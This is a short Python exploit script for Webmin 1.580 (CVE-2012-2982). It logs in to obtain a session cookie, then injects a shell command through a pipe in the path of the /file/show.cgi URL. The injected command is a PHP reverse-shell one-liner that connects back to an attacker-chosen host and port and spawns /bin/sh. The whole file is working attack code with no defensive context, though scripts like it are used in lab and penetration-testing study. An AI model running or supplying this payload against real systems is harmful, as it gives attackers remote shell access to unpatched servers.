#!/bin/env python3
#webmin 1.580 exploit
#cve-2012-2982

import requests,re
url = "http://localhost:10000"
proxy={
    'http':'http://127.0.0.1:8080'
}

webmin_user = ""
webmin_pass = ""
lhost = ""
lport = ""

def getSid():
    login = {
        "page":"/",
        "user":f"{webmin_user}",
        "pass":f"{webmin_pass}"
        }
    cookies = {
        'testing':'1',
        'sid':'x'
    }
    r = requests.post(url+'/session_login.cgi',data=login,cookies=cookies,allow_redirects=False)
    setCookie =r.headers['Set-Cookie']
    return re.search("sid=(.*);",setCookie)[1]

def exploit(sid):
    #sid = getSid()
    print('exploiting. . .')
    #bash reverse shells dont play nice, php do tho
    command = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
    
    cookies = {
        'sid':sid
    }
    r = requests.get(url+f"/file/show.cgi/bin/123fgtrdsa|{command}|",cookies=cookies)

if __name__ == "__main__":
    print('Getting sid...')
    sid = getSid()
    print("Sid got . . .")
    print("Exploiting")
    exploit(sid)
    print("finish")